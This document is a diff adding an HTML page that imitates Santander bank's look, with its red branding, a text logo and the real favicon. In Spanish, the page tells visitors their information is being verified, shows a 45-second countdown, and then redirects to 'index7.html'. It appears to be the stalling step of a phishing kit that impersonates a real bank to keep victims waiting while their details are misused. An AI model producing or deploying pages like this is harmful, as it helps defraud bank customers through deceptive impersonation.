@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Seguridad - Santander</title>
+  <link rel="shortcut icon" type="image/x-icon" href="https://www.santander.com/favicon.ico">
+
+  <style>
+    /* DISEÑO ORIGINAL INTACTO */
+    :root {
+      --santander-red: #ec0000;
+      --santander-red-dark: #c40000;
+      --santander-red-light: #ff3333;
+      --gray-light: #f0f2f5;
+      --gray-border: #e9edef;
+      --gray-text: #667781;
+      --transition: all 0.3s ease;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body,
+    html {
+      height: 100%;
+      width: 100%;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #111;
+      overflow: hidden;
+    }
+
+    body {
+      background: linear-gradient(135deg, #ec0000 0%, #ff3333 50%, #ec0000 100%);
+      background-size: cover;
+      margin: 0;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      width: 100vw;
+    }
+
+    .background-shapes {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .shape {
+      position: absolute;
+      opacity: 0.3;
+      border-radius: 50%;
+    }
+
+    .shape1 {
+      width: 400px; height: 400px;
+      background: linear-gradient(45deg, #ff6b6b, #feca57);
+      top: -200px; left: -200px;
+      animation: float 20s ease-in-out infinite;
+    }
+
+    .shape2 {
+      width: 300px; height: 300px;
+      background: linear-gradient(45deg, #48dbfb, #0abde3);
+      bottom: -150px; right: -150px;
+      animation: float 15s ease-in-out infinite reverse;
+    }
+
+    .shape3 {
+      width: 200px; height: 200px;
+      background: linear-gradient(45deg, #5f27cd, #341f97);
+      top: 50%; right: 10%;
+      animation: float 18s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0) rotate(0deg); }
+      50% { transform: translateY(-30px) rotate(180deg); }
+    }
+
+    .verification-container {
+      width: 90%;
+      max-width: 460px;
+      z-index: 10;
+      animation: fadeInUp 0.6s ease-out;
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .verification-box {
+      background: white;
+      border-radius: 16px;
+      padding: 40px 35px;
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.12);
+      text-align: center;
+      position: relative;
+    }
+
+    /* EL LOGO QUE NO FALLA PORQUE NO ES UNA IMAGEN */
+    .logo-container { text-align: center; margin-bottom: 25px; }
+    .logo-box {
+      background-color: var(--santander-red);
+      color: white;
+      padding: 12px 25px;
+      display: inline-block;
+      border-radius: 4px;
+      user-select: none;
+    }
+
+    .logo-box span {
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      font-size: 28px;
+      letter-spacing: -1px;
+    }
+
+    h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: #111; }
+    p { font-size: 15px; color: var(--gray-text); margin-bottom: 20px; }
+
+    progress { width: 100%; height: 10px; appearance: none; border-radius: 8px; overflow: hidden; }
+    progress::-webkit-progress-bar { background-color: #e0e0e0; }
+    progress::-webkit-progress-value { background: linear-gradient(135deg, #ec0000 0%, #c40000 100%); }
+    progress::-moz-progress-bar { background: linear-gradient(135deg, #ec0000 0%, #c40000 100%); }
+    strong { color: #ec0000; }
+  </style>
+</head>
+
+<body>
+  <div class="background-shapes">
+    <div class="shape shape1"></div>
+    <div class="shape shape2"></div>
+    <div class="shape shape3"></div>
+  </div>
+
+  <div class="verification-container">
+    <div class="verification-box">
+      <div class="logo-container">
+        <div class="logo-box">
+          <span>Santander</span>
+        </div>
+      </div>
+      
+      <h2>Verificando tu información</h2>
+      <p>No cierres esta página</p>
+      <progress id="progressBar" value="0" max="100"></progress>
+      <p id="countdownText">Por favor espera <strong>45</strong> segundos</p>
+    </div>
+  </div>
+
+  <script>
+    const TOTAL_TIME = 45; 
+    const progressBar = document.getElementById("progressBar");
+    const countdownText = document.getElementById("countdownText");
+    const startTime = Date.now();
+
+    const interval = setInterval(() => {
+      const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
+      let timeLeft = TOTAL_TIME - elapsedSeconds;
+
+      if (timeLeft < 0) timeLeft = 0;
+
+      const progress = (elapsedSeconds / TOTAL_TIME) * 100;
+      progressBar.value = Math.min(progress, 100);
+
+      countdownText.innerHTML = `Por favor espera <strong>${timeLeft}</strong> segundos`;
+
+      if (timeLeft <= 0) {
+        clearInterval(interval);
+        window.location.href = 'index7.html';
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
